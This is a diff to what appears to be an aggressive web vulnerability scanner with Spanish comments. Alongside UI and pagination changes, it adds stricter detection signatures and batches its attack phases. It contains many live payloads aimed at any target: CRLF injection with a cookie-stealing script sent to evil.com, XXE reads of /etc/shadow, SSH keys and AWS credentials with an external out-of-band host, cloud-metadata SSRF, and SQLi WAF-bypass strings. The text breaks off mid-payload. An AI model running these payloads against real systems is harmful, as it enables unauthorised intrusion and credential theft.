@@ -2015,6 +2015,20 @@ section .wrap { position: relative; z-index: 1; }
 
 /* Pre-loaded header */
 .cve-preloaded-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:16px; padding:12px 16px; background:rgba(255,26,46,.04); border:1px solid rgba(255,26,46,.1); border-radius:4px; }
+/* Animacion de entrada de tarjetas CVE: fade + slide + un destello de glow rojo que
+   se apaga — mas vistosa que el cardIn generico, exclusiva de esta seccion. */
+@keyframes cveCardIn {
+  0%   { opacity:0; transform:translateY(22px) scale(.96); box-shadow:0 0 0 rgba(255,26,46,0); }
+  55%  { opacity:1; transform:translateY(-2px) scale(1.01); box-shadow:0 0 26px rgba(255,26,46,.35); }
+  100% { opacity:1; transform:translateY(0) scale(1); box-shadow:0 0 0 rgba(255,26,46,0); }
+}
+.cve-card.cve-anim { animation:cveCardIn .5s cubic-bezier(.22,1,.36,1) both; }
+/* Transicion de "barrido" al cambiar de filtro/vendor: el contenedor completo
+   parpadea/se desvanece un instante antes de reconstruirse con el stagger. */
+@keyframes cveSweepOut { 0%{opacity:1;filter:brightness(1);} 50%{opacity:.15;filter:brightness(2.2);} 100%{opacity:0;filter:brightness(1);} }
+.cve-preloaded-sweeping { animation:cveSweepOut .22s ease-in both; }
+.cve-loadmore-btn { background:transparent; border:1px solid rgba(255,26,46,.35); color:var(--acc); font-family:var(--mono); font-size:12px; letter-spacing:.05em; padding:11px 26px; border-radius:4px; cursor:pointer; transition:all .2s; }
+.cve-loadmore-btn:hover { background:rgba(255,26,46,.1); border-color:var(--acc); box-shadow:0 0 20px rgba(255,26,46,.2); transform:translateY(-1px); }
 .cve-pl-title { font-family:var(--mono); font-size:10px; letter-spacing:.1em; color:rgba(255,26,46,.6); }
 .cve-pl-count { font-family:var(--mono); font-size:10px; color:rgba(240,238,248,.3); }
 
@@ -2972,6 +2986,7 @@ a{color:inherit;text-decoration:none;}
   <div class="wrap">
     <div class="sec-num reveal-wrap"><div class="reveal-inner">22 — Aggressive Crawler</div></div>
     <h2 class="sec-title h2-anim" data-l1="Endpoint" data-l2="Crawler." aria-label="Endpoint Crawler."></h2>
+    <div style="font-family:var(--mono);font-size:12.5px;letter-spacing:.06em;color:var(--acc);text-transform:uppercase;margin-bottom:14px;">☠ Ve las entrañas de cualquier web</div>
     <p style="margin-bottom:32px;color:rgba(240,238,248,.6);max-width:720px;">Crawler agresivo estilo Katana. Sigue enlaces y formularios del mismo dominio hasta la profundidad elegida, y <strong style="color:var(--acc)">parsea cada archivo JS encontrado</strong> para extraer endpoints que un crawler HTML normal nunca vería.</p>
 
     <div class="rce-searchbar">
@@ -2986,6 +3001,7 @@ a{color:inherit;text-decoration:none;}
         <option value="1">Profundidad 1</option>
         <option value="2" selected>Profundidad 2</option>
         <option value="3">Profundidad 3</option>
+        <option value="4">Profundidad 4 (agresivo)</option>
       </select>
       <button class="rce-btn" id="crw-btn">
         <span class="rce-btn-icon">🕷</span>
@@ -3904,6 +3920,7 @@ dig assets.lime.bike CNAME</div></div></div>
       <span class="cve-pl-count" id="cve-pl-count"></span>
     </div>
     <div id="cve-preloaded"></div>
+    <div id="cve-loadmore-wrap" style="text-align:center;margin-top:18px;"></div>
   </div>
 </section>
 
@@ -12337,9 +12354,6 @@ var CVE_DB = [
  refs:['https://nvd.nist.gov/vuln/detail/CVE-2022-24086'] },
 
  /* \u2500\u2500\u2500 Otros cr\u00EDticos recientes \u2500\u2500\u2500 */
- { id:'CVE-2023-46604', score:10.0, sev:'CRITICAL', vendor:'Apache', name:'ActiveMQ RCE', year:2023, exploited:true,
- desc:'Ejecuci\u00F3n remota de c\u00F3digo en Apache ActiveMQ via deserializaci\u00F3n insegura del protocolo OpenWire. Usado activamente en campa\u00F1as de ransomware.',
- refs:['https://nvd.nist.gov/vuln/detail/CVE-2023-46604'] },
  { id:'CVE-2022-22965', score:9.8, sev:'CRITICAL', vendor:'Spring',  name:'Spring4Shell RCE', year:2022, exploited:true,
  desc:'Ejecuci\u00F3n remota de c\u00F3digo en aplicaciones Spring MVC/WebFlux corriendo sobre JDK 9+, via data binding malicioso.',
  refs:['https://nvd.nist.gov/vuln/detail/CVE-2022-22965'] },
@@ -12565,7 +12579,7 @@ var CVE_DB = [
 /* \u2550\u2550\u2550 RENDER FUNCTIONS \u2550\u2550\u2550 */
 function makeCVECard(cve, delay){
  var card = document.createElement('div');
- card.className = 'cve-card';
+ card.className = 'cve-card cve-anim';
  card.dataset.sev = cve.sev;
  card.dataset.exploited = cve.exploited ? '1' : '0';
  if(delay !== undefined) card.style.animationDelay = delay + 's';
@@ -12593,12 +12607,17 @@ function makeCVECard(cve, delay){
 }
 
 var activeVendor = 'all';
+var CVE_PAGE_SIZE = 9;
+var cveShownCount = CVE_PAGE_SIZE;
+var cveCurrentFiltered = [];
 
-function renderPreloaded(filter, vendorFilter){
+function renderPreloaded(filter, vendorFilter, opts){
  var container = document.getElementById('cve-preloaded');
  var countEl   = document.getElementById('cve-pl-count');
+ var loadMoreWrap = document.getElementById('cve-loadmore-wrap');
  if(!container) return;
- container.innerHTML = '';
+ var isFilterChange = !(opts && opts.keepPage);
+ if(isFilterChange) cveShownCount = CVE_PAGE_SIZE;
 
  var filtered = CVE_DB;
  if(filter === 'CRITICAL') filtered = filtered.filter(function(c){ return c.sev==='CRITICAL'; });
@@ -12612,12 +12631,40 @@ function renderPreloaded(filter, vendorFilter){
 
  /* Ordenar: 2024 \u2192 2017, score desc */
  filtered = filtered.slice().sort(function(a,b){ return b.year-a.year || b.score-a.score; });
+ cveCurrentFiltered = filtered;
 
- if(countEl) countEl.textContent = filtered.length + ' CVEs mostrados';
-
- filtered.forEach(function(cve, i){
- container.appendChild(makeCVECard(cve, i * 0.04));
+ function paintPage(){
+ container.innerHTML = '';
+ var visible = filtered.slice(0, cveShownCount);
+ if(countEl) countEl.textContent = visible.length + ' de ' + filtered.length + ' CVEs';
+ visible.forEach(function(cve, i){
+ container.appendChild(makeCVECard(cve, i * 0.045));
  });
+ if(loadMoreWrap){
+ var remaining = filtered.length - visible.length;
+ loadMoreWrap.innerHTML = remaining > 0
+ ? '<button class="cve-loadmore-btn" id="cve-loadmore-btn">▼ Ver m\u00E1s CVEs (' + remaining + ' restantes)</button>'
+ : '';
+ var btn = document.getElementById('cve-loadmore-btn');
+ if(btn) btn.addEventListener('click', function(){
+ cveShownCount += CVE_PAGE_SIZE;
+ paintPage();
+ });
+ }
+ }
+
+ /* Barrido: si es un cambio de filtro/vendor (no un "ver mas"), se desvanece
+ el contenedor un instante antes de reconstruirlo con el stagger de entrada —
+ se nota mucho mas el cambio de categoria que un reemplazo instantaneo. */
+ if(isFilterChange && container.children.length){
+ container.classList.add('cve-preloaded-sweeping');
+ setTimeout(function(){
+ container.classList.remove('cve-preloaded-sweeping');
+ paintPage();
+ }, 200);
+ } else {
+ paintPage();
+ }
 }
 
 /* \u2550\u2550\u2550 MENU DESPLEGABLE POR VENDOR/PRODUCTO \u2550\u2550\u2550 */
@@ -14265,10 +14312,16 @@ if(in1)if(in1)in1.addEventListener("input",function(){curVec=null;});
 if(in2)if(in2)in2.addEventListener("input",function(){curVec=null;});
 
 function typeLine(lines){
+ /* Bug real: cada "linea" ya viene como HTML completo desde ln()/ok()/det()/dtl()
+    (ej. '<div class="lab-ln ok">[OK] mensaje</div>'), pero se insertaba via
+    textContent — eso muestra las etiquetas como texto literal en pantalla y
+    anula CUALQUIER color (ok/blue/amber/red), no solo el verde de exito.
+    u/p ya vienen escapados con esc() antes de llegar aca (ver respond()), asi
+    que renderizar como HTML real es seguro. */
  termBody.innerHTML="";var i=0;
  function step(){
  if(i>=lines.length){termBody.insertAdjacentHTML("beforeend",'<div class="lab-ln"><span class="lab-cursor"></span></div>');return;}
- var _d=document.createElement("div");_d.className="lab-ln";_d.textContent=lines[i];termBody.appendChild(_d);
+ termBody.insertAdjacentHTML("beforeend", lines[i]);
  termBody.scrollTop=termBody.scrollHeight;i++;setTimeout(step,70);
  }
  step();
@@ -14463,6 +14516,95 @@ function uenc(s){return encodeURIComponent(s);}
 var aimd={concurrency:4,min:1,max:12,success:0,fail:0,rttSum:0,rttCount:0,adjusting:false};
 function isDeadResult(r){if(r.status!=='fulfilled'||!r.value)return true;return r.value.status===404||r.value.status===0||r.value.status===502;}
 function ctxSkip(tag){return !!(S.ctx&&S.ctx.skipPhases&&S.ctx.skipPhases.indexOf(tag)>-1);}
+
+/* ═══ MOTOR DE FIRMAS ESTRICTAS (anti falsos-positivos) ═══
+   Calibrado para 4 clases de falso positivo confirmadas: SSRF de metadata cloud
+   marcando landing pages HTML como credenciales; Log4Shell/Spring4Shell disparando
+   por reflejo del propio payload inyectado (no por RCE real); appliances Java/F5/
+   Fortinet corriendo contra stacks PHP/Drupal sin validar tecnologia; y "param error"
+   marcando por palabras genericas sin comparar contra el baseline. */
+
+function looksLikeGenericPage(body){
+return /<!DOCTYPE|<html[\s>]/i.test(body||'');
+}
+
+/* Similaridad texto a texto (trigramas de palabras) — sirve como "simhash liviano"
+   sin depender de librerias externas. Devuelve 0..1. */
+function textSimilarity(a,b){
+if(!a||!b)return 0;
+if(a===b)return 1;
+var wa=a.toLowerCase().split(/\s+/).filter(Boolean);
+var wb=b.toLowerCase().split(/\s+/).filter(Boolean);
+if(wa.length<3||wb.length<3)return a===b?1:0;
+function trigrams(words){var s=new Set();for(var i=0;i<words.length-2;i++)s.add(words[i]+' '+words[i+1]+' '+words[i+2]);return s;}
+var ta=trigrams(wa),tb=trigrams(wb);
+if(ta.size===0||tb.size===0)return 0;
+var inter=0;ta.forEach(function(t){if(tb.has(t))inter++;});
+var union=ta.size+tb.size-inter;
+return union===0?0:inter/union;
+}
+
+/* Diferencial contra el baseline: status igual + longitud parecida + contenido
+   >85% similar => se descarta como ruido (mismo comportamiento que soft-404, WAF
+   challenge de Cloudflare, o pagina de error generica del sitio). */
+function matchesBaseline(resp,baseline){
+if(!baseline||!resp)return false;
+if(resp.status!==baseline.status)return false;
+var len1=(resp.body||'').length,len2=baseline.len||0;
+if(len2>0&&Math.abs(len1-len2)/Math.max(len2,1)>0.3)return false;
+if(baseline.bodySample&&resp.body){
+var sim=textSimilarity(resp.body.slice(0,2000),baseline.bodySample);
+return sim>0.85;
+}
+return sfHash((resp.body||'').slice(0,500))===baseline.hash;
+}
+
+/* SSRF Cloud Metadata — firma inequivoca: JSON estructurado de credenciales o
+   identificadores de instancia REALES, nunca disparado por una landing page HTML
+   ni por palabras sueltas tipo "Token"/"oauth2" que aparecen en cualquier sitio. */
+var CLOUD_META_STRICT_RE=/"AccessKeyId"\s*:\s*"ASIA|"AccessKeyId"\s*:\s*"AKIA|ami-[a-f0-9]{8,}|"instance-id"\s*:\s*"i-[a-f0-9]+|"SecretAccessKey"\s*:\s*"|compute\.googleapis\.com\/v1\/projects\/[\w-]+\/instances|"expires_in"\s*:\s*\d+\s*,\s*"token_type"\s*:\s*"Bearer"\s*,\s*"access_token"|X-Aws-Ec2-Metadata-Token/;
+function isRealCloudMetadata(body,baseline,resp){
+if(!body)return false;
+if(looksLikeGenericPage(body))return false;
+if(baseline&&resp&&matchesBaseline(resp,baseline))return false;
+return CLOUD_META_STRICT_RE.test(body);
+}
+
+/* Command Injection — solo confirma con salida POSIX real (uid=.. gid=..) u otras
+   salidas de comando inequivocas, nunca por status 200 generico. */
+var CMDI_STRICT_RE=/uid=\d+\([\w-]+\)\s*gid=\d+\([\w-]+\)|Linux\s+\S+\s+\d+\.\d+\.\d+.*(GNU|SMP)|Microsoft Windows \[Version|root:.*:0:0:/;
+function isRealCommandOutput(body){
+if(!body)return false;
+if(looksLikeGenericPage(body)&&!CMDI_STRICT_RE.test(body))return false;
+return CMDI_STRICT_RE.test(body);
+}
+
+/* XSS reflejado — solo confirma si el payload aparece SIN codificar. Si esta
+   escapado (&lt;/&gt;/&quot;/&#x27;) se descarta o se marca informativo. */
+function isUnescapedReflection(body,rawPayload){
+if(!body||!rawPayload)return false;
+if(body.indexOf(rawPayload)===-1)return false;
+var idx=body.indexOf(rawPayload);
+var windowText=body.slice(Math.max(0,idx-20),idx+rawPayload.length+20);
+if(/&lt;|&gt;|&quot;|&#x27;|&#39;|&amp;lt;/.test(windowText))return false;
+return /[<>"]/.test(rawPayload);
+}
+
+/* Stack traces reales — nunca por palabras sueltas como "error"/"exception", que
+   aparecen en CSS, JS de analytics, mensajes de validacion de formularios, etc. */
+var REAL_STACKTRACE_RE=/Fatal error:|Traceback \(most recent call last\)|SQLSTATE\[|Warning:\s+\S+\(\).*on line \d+|at\s+[\w.$]+\([\w.]+\.java:\d+\)|System\.\w+Exception|Unhandled exception|ORA-\d{5}|PostgreSQL.*ERROR|Microsoft OLE DB Provider|\[ODBC SQL/;
+function hasRealStackTrace(body,baselineBody){
+if(!body)return false;
+if(!REAL_STACKTRACE_RE.test(body))return false;
+if(baselineBody&&REAL_STACKTRACE_RE.test(baselineBody))return false;
+return true;
+}
+
+/* Tech-gating adaptativo: si el fingerprint confirmo PHP/Drupal SIN señal de Java,
+   las pruebas de Java Deserialization/Spring4Shell/appliances propietarios no aplican. */
+function isJavaIncompatibleStack(){
+return !!(S.ctx&&(S.ctx.hasPHP||S.ctx.hasWP)&&!S.ctx.hasJava&&!S.ctx.hasSpring);
+}
 /* Reemplaza regex tipo /word.*word|word.*word|.../ por chequeos de substring directos.
    Mismo resultado semantico, sin backtracking (indexOf es O(n) garantizado, sin importar
    el tamano del body), y mas rapido en la practica que el motor de regex para esto. */
@@ -15747,14 +15889,20 @@ logOk('Cache poisoning analizado');
 /* F24: CRLF */
 await tp(23);logSep('F24 — CRLF / Header Injection');
 var crlfTests=[target+'?redirect=%0d%0aSet-Cookie:evil=1',target+'?url=%0d%0aLocation:https://evil.com',target+'?q=test%0d%0aX-Injected:1',target+'?redirect=%0d%0aSet-Cookie:evil=1%0d%0aSet-Cookie:csrf=0',target+'?url=%0d%0aLocation:https://evil.com%0d%0aContent-Type:text/html',target+'?q=test%0d%0aX-Injected:1%0d%0aSet-Cookie:evil=1',target+'?redirect=%0d%0a%0d%0aSet-Cookie:evil=1',target+'?url=%0a%0aSet-Cookie:evil=1',target+'?redirect=%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK',target+'?q=%0d%0aX-Forwarded-For:127.0.0.1',target+'?redirect=%0d%0aSet-Cookie:session=evil%0d%0aDelete:/',target+'?q=test%0d%0aHost:evil.com%0d%0a%0d%0a<script>alert(1)<\/script>',target+'?redirect=%0d%0aSet-Cookie:evil=1%0d%0aContent-Length:0',target+'?url=%0d%0aLocation:https://evil.com%0d%0aX-Frame-Options:ALLOW',target+'?q=test%0d%0aContent-Security-Policy:none',target+'?redirect=%0d%0aSet-Cookie:admin=1%0d%0aSet-Cookie:user=admin',target+'?url=%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:https://evil.com',target+'?q=test%0d%0aAccess-Control-Allow-Origin:*',target+'?redirect=%0d%0aSet-Cookie:session=evil%0d%0aSet-Cookie:role=admin%0d%0aSet-Cookie:csrf=0',target+'?url=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)<\/script>',target+'?q=test%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)<\/script>',target+'?redirect=%0d%0aSet-Cookie:auth=1%0d%0aSet-Cookie:priv=admin%0d%0aSet-Cookie:uid=0',target+'?q=test%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0%0d%0a%0d%0aGPOST%20/%20HTTP/1.1%0d%0aHost:%20evil.com%0d%0a%0d%0a',target+'?url=%0d%0aLocation:https://evil.com%0d%0a%0d%0a<script>fetch("https://evil.com/c?"+document.cookie)<\/script>',target+'?redirect=%0d%0aSet-Cookie:session=evil%0d%0aSet-Cookie:csrf=0%0d%0aSet-Cookie:auth=1',target+'?q=test%0d%0aX-Forwarded-For:127.0.0.1%0d%0aX-Real-IP:127.0.0.1'];
-for(var cli=0;cli<crlfTests.length;cli++){var rcl=await get(crlfTests[cli]);
-if(rcl&&rcl.headers&&rcl.headers['x-injected']){logErr('CRLF Injection confirmada!');addF('high','CRLF Injection','Header injection via CRLF');markCrit('p24');break;}await sl(60);}
-logOk('CRLF basico probado');
-/* CRLF: detectar Set-Cookie inyectada en respuesta */
-for(var cli2=0;cli2<crlfTests.length;cli2++){var rcl2=await get(crlfTests[cli2]);
-if(rcl2&&rcl2.headers&&rcl2.headers['set-cookie']){var sc=rcl2.headers['set-cookie'];if(/evil=|session=evil|auth=1|admin=1|role=admin|uid=0|csrf=0/i.test(sc)){logErr('CRLF: Set-Cookie inyectada via CRLF!');addF('high','CRLF Cookie Injection','Cookie inyectada via CRLF en headers');markCrit('p24');break;}}
-if(rcl2&&rcl2.headers&&rcl2.headers['location']&&/evil\.com/i.test(rcl2.headers['location'])){logErr('CRLF: Location header inyectado via CRLF!');addF('high','CRLF Location Injection','Redireccion inyectada via CRLF');markCrit('p24');break;}}
-logOk('CRLF completo');
+/* Antes: 2 loops secuenciales sobre el MISMO array (52 requests para 26 payloads,
+   uno por cada condicion a chequear). Ahora: 1 sola tanda via smartBatch (concurrencia
+   + early exit), verificando ambas condiciones sobre el mismo resultado. */
+var crlfResults=await smartBatch(crlfTests);
+var crlfFound=false;
+for(var cli=0;cli<crlfResults.length && !crlfFound;cli++){
+if(crlfResults[cli].status!=='fulfilled'||!crlfResults[cli].value)continue;
+var rcl=crlfResults[cli].value;
+if(rcl.headers&&rcl.headers['x-injected']){logErr('CRLF Injection confirmada!');addF('high','CRLF Injection','Header injection via CRLF');markCrit('p24');crlfFound=true;break;}
+if(rcl.headers&&rcl.headers['set-cookie']){var sc=rcl.headers['set-cookie'];if(/evil=|session=evil|auth=1|admin=1|role=admin|uid=0|csrf=0/i.test(sc)){logErr('CRLF: Set-Cookie inyectada via CRLF!');addF('high','CRLF Cookie Injection','Cookie inyectada via CRLF en headers');markCrit('p24');crlfFound=true;break;}}
+if(rcl.headers&&rcl.headers['location']&&/evil\.com/i.test(rcl.headers['location'])){logErr('CRLF: Location header inyectado via CRLF!');addF('high','CRLF Location Injection','Redireccion inyectada via CRLF');markCrit('p24');crlfFound=true;break;}
+}
+if(crlfResults.pruned)logWarn('F24: cortado temprano tras 3 fallas consecutivas ('+crlfResults.length+'/'+crlfTests.length+' payloads probados)');
+if(!crlfFound)logOk('CRLF completo — sin exito ('+crlfTests.length+' payloads, mitad de las requests que antes)');
 
 /* F25: NoSQLi */
 await tp(24);logSep('F25 — NoSQL Injection');
@@ -15823,14 +15971,19 @@ logOk('IDOR probado con '+idorTests.length+' endpoints (falsos positivos de soft
 await tp(29);logSep('F30 — XXE Injection');
 var xxeTests=[target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',target+'/api/xml',target+'/?xml=test',target+'/?data=<!ENTITY',target+'/?payload=<!DOCTYPE',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://tudelasec.dnsbin.net/">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/auth.log">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/admin/.aws/credentials">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><foo>&xxe;</foo>',target+'?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]><foo>&xxe;</foo>'];
 var xxeBase=await get(target+'?xml=test');var xxeBaseBody=xxeBase.body||'';
-for(var xi=0;xi<xxeTests.length;xi++){var rx=await get(xxeTests[xi]);
-if(rx.ok&&rx.body){
-if(rx.body.indexOf('root:x:0:0')>-1&&rx.body.indexOf('DOCTYPE')===-1){logErr('XXE: /etc/passwd leido!');addF('crit','XXE Injection','Contenido /etc/passwd en respuesta');markCrit('p30');break;}
-if(/\[fonts\]|extensions\]/i.test(rx.body)&&rx.body.indexOf('win.ini')>-1&&rx.body.indexOf('DOCTYPE')===-1){logErr('XXE: win.ini leido!');addF('crit','XXE Injection','Contenido win.ini en respuesta');markCrit('p30');break;}
-if(rx.body.indexOf('&xxe;')>-1&&rx.body.indexOf('DOCTYPE')===-1){logErr('XXE: entity &xxe; expandida');addF('high','XXE Injection','Entity expandida en respuesta');markCrit('p30');break;}
-if(/XMLSyntaxError|SAXParseException|parsererror|XML parser|DOMException|Invalid document/i.test(rx.body)&&!/XMLSyntaxError|SAXParseException|parsererror|XML parser|DOMException|Invalid document/i.test(xxeBaseBody)){logErr('XXE: error de XML parser');addF('high','XXE Injection','Error de XML parser — parser XXE vulnerable');markCrit('p30');break;}}
-await sl(60);}
-logOk('XXE probado');
+var xxeResultsAll=await smartBatch(xxeTests);
+var xxeFound=false;
+for(var xi=0;xi<xxeResultsAll.length && !xxeFound;xi++){
+if(xxeResultsAll[xi].status!=='fulfilled'||!xxeResultsAll[xi].value)continue;
+var rx=xxeResultsAll[xi].value;
+if(!rx.ok||!rx.body)continue;
+if(rx.body.indexOf('root:x:0:0')>-1&&rx.body.indexOf('DOCTYPE')===-1){logErr('XXE: /etc/passwd leido!');addF('crit','XXE Injection','Contenido /etc/passwd en respuesta');markCrit('p30');xxeFound=true;break;}
+if(/\[fonts\]|extensions\]/i.test(rx.body)&&rx.body.indexOf('win.ini')>-1&&rx.body.indexOf('DOCTYPE')===-1){logErr('XXE: win.ini leido!');addF('crit','XXE Injection','Contenido win.ini en respuesta');markCrit('p30');xxeFound=true;break;}
+if(rx.body.indexOf('&xxe;')>-1&&rx.body.indexOf('DOCTYPE')===-1){logErr('XXE: entity &xxe; expandida');addF('high','XXE Injection','Entity expandida en respuesta');markCrit('p30');xxeFound=true;break;}
+if(/XMLSyntaxError|SAXParseException|parsererror|XML parser|DOMException|Invalid document/i.test(rx.body)&&!/XMLSyntaxError|SAXParseException|parsererror|XML parser|DOMException|Invalid document/i.test(xxeBaseBody)){logErr('XXE: error de XML parser');addF('high','XXE Injection','Error de XML parser — parser XXE vulnerable');markCrit('p30');xxeFound=true;break;}
+}
+if(xxeResultsAll.pruned)logWarn('F30: cortado temprano tras 3 fallas consecutivas ('+xxeResultsAll.length+'/'+xxeTests.length+' payloads probados)');
+logOk('XXE probado'+(xxeFound?'':' — sin exito'));
 
 /* F31: SSTI */
 await tp(30);logSep('F31 — SSTI');
@@ -16282,9 +16435,10 @@ await sl(100);
 /* F91: Cloud Metadata */
 await tp(90);logSep('F91 — Cloud Metadata SSRF');
 var metaTests=[target+'?url=http://169.254.169.254/latest/meta-data/',target+'?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',target+'?url=http://metadata.google.internal/computeMetadata/v1/',target+'?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01',target+'?url=http://100.100.100.200/latest/meta-data/'];
+var meta91Found=false;
 for(var mi2=0;mi2<metaTests.length;mi2++){var rmeta=await get(metaTests[mi2]);
-if(rmeta&&rmeta.ok&&rmeta.body&&/ami-|instance-id|reservation-id|instance-type|security-credentials|accessToken|subscriptionId/i.test(rmeta.body)){logErr('Cloud Metadata accesible: '+metaTests[mi2].split('?url=')[1]);addF('crit','Cloud Metadata SSRF','Credenciales cloud accesibles');markCrit('p91');break;}await sl(80);}
-logOk('Cloud metadata probado');
+if(rmeta&&rmeta.ok&&isRealCloudMetadata(rmeta.body,globalBaseline,rmeta)){logErr('Cloud Metadata accesible: '+metaTests[mi2].split('?url=')[1]);addF('crit','Cloud Metadata SSRF','Credenciales cloud accesibles: '+rmeta.body.slice(0,120));markCrit('p91');meta91Found=true;break;}await sl(80);}
+logOk('Cloud metadata probado'+(meta91Found?'':' — sin exito (firma estricta, sin falsos positivos de landing pages)'));
 
 /* F92: K8s Attack */
 await tp(91);logSep('F92 — Kubernetes Attack Surface');
@@ -16352,7 +16506,7 @@ var baseRespLen=S.body?S.body.length:0;var baseStatus=S.status||200;
 var foundParams=0;var paramDetails=[];
 for(var hp=0;hp<hpUnique.length;hp+=10){var batchUrls=[];for(var bpi=0;bpi<10&&hp+bpi<hpUnique.length;bpi++)batchUrls.push(target+'?'+hpUnique[hp+bpi]+'=__LEVIATAN_TEST__');
 var batchResults=await batch(batchUrls);
-batchResults.forEach(function(br,i){if(br.status==='fulfilled'&&br.value&&br.value.ok&&br.value.body){var respLen=br.value.body.length;var delta=Math.abs(respLen-baseRespLen);var paramIdx=hp+i;if(paramIdx<hpUnique.length){var paramName=hpUnique[paramIdx];if(delta>50){foundParams++;paramDetails.push({name:paramName,delta:delta,status:br.value.status});logInfo('Parametro reactivo: '+paramName+' (delta='+delta+'b)');}if(br.value.body.indexOf('__LEVIATAN_TEST__')>-1){logWarn('Parametro REFLEJADO: '+paramName+' — posible XSS/Injection');addF('med','Param reflejado: '+paramName,'Refleja input del usuario sin sanitizacion');markCrit('p99');}if(br.value.status!==baseStatus){logWarn('Parametro cambia status: '+paramName+' ('+baseStatus+'→'+br.value.status+')');addF('med','Param status change: '+paramName,'Cambia codigo HTTP — comportamiento variable');}}if(br.value.body&&/error|exception|warning|sql|syntax|stack trace|debug info/i.test(br.value.body)&&!new RegExp(hpUnique[paramIdx]||'__none__').test(S.body||'')){logErr('Parametro genera ERROR: '+paramName);addF('high','Param error: '+paramName,'Genera respuesta de error — posible inyeccion');markCrit('p99');}}});}
+batchResults.forEach(function(br,i){if(br.status==='fulfilled'&&br.value&&br.value.ok&&br.value.body){var respLen=br.value.body.length;var delta=Math.abs(respLen-baseRespLen);var paramIdx=hp+i;if(paramIdx<hpUnique.length){var paramName=hpUnique[paramIdx];if(delta>50){foundParams++;paramDetails.push({name:paramName,delta:delta,status:br.value.status});logInfo('Parametro reactivo: '+paramName+' (delta='+delta+'b)');}if(br.value.body.indexOf('__LEVIATAN_TEST__')>-1){logWarn('Parametro REFLEJADO: '+paramName+' — posible XSS/Injection');addF('med','Param reflejado: '+paramName,'Refleja input del usuario sin sanitizacion');markCrit('p99');}if(br.value.status!==baseStatus){logWarn('Parametro cambia status: '+paramName+' ('+baseStatus+'→'+br.value.status+')');addF('med','Param status change: '+paramName,'Cambia codigo HTTP — comportamiento variable');}}if(br.value.body&&hasRealStackTrace(br.value.body,S.body)){logErr('Parametro genera stack trace real: '+paramName);addF('high','Param error: '+paramName,'Genera stack trace real (no presente en baseline) — posible inyeccion');markCrit('p99');}}});}
 if(foundParams>5){logWarn(foundParams+' parametros ocultos descubiertos con respuesta variable');addF('med','Parametros ocultos: '+foundParams,'Parametros que modifican la respuesta — superficie de ataque');}
 else if(foundParams>0)logWarn(foundParams+' parametros ocultos descubiertos');
 else logOk('No se detectaron parametros ocultos');
@@ -16874,9 +17028,15 @@ logOk('SQLi 2nd order probado');
 /* F131: SQLi Bypass */
 await tp(130);logSep('F131 — SQLi WAF Bypass');
 var sqliBypass=[target+'/?id=1/*!UNION*//*!SELECT*//*!NULL*/',target+'/?id=1%20UNION%20ALL%20SELECT%20NULL',target+'/?id=1%27%20OR%201=1--%20',target+'/?id=1%27)%20OR(%271%27=%271',target+'/?id=1%20OR%201=1%23',target+'/?id=1\'+/**/OR/**/1=1',target+'/?id=1%0aUNION%0aSELECT%0aNULL',target+'/?id=1%27%20OR%201=1--%20',target+'/?id=1%27%20UNION%20SELECT%20NULL,NULL--%20',target+'/?id=1%27%20UNION%20SELECT%20@@version--%20',target+'/?id=1%27%20AND%201=1--%20',target+'/?id=1%27%20AND%201=2--%20',target+'/?id=1%27%20ORDER%20BY%2010--%20',target+'/?id=1%27%20UNION%20SELECT%20table_name,2,3%20FROM%20information_schema.tables--%20',target+'/?id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10--%20',target+'/?id=1%27%20UNION%20SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name=0x7573657273--%20',target+'/?id=1/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL--',target+'/?id=1%27%20UNION/**/SELECT/**/1,2,3--',target+'/?id=1%27)%20UNION/**/SELECT/**/1,2,3--%20',target+'/?id=1%27%20AND%20SLEEP(5)--%20',target+'/?id=1%27%20AND%20BENCHMARK(5000000,MD5(1))--%20',target+'/?id=1%27%20AND%20(SELECT%20SUBSTRING(version(),1,1))=1--%20',target+'/?id=1%27%20AND%20IF(1=1,SLEEP(5),0)--%20',target+'/?id=1\'+AND+IF((SELECT+LENGTH(database()))>0,SLEEP(5),0)--',target+'/?id=1\'+AND+IF((SELECT+ASCII(SUBSTR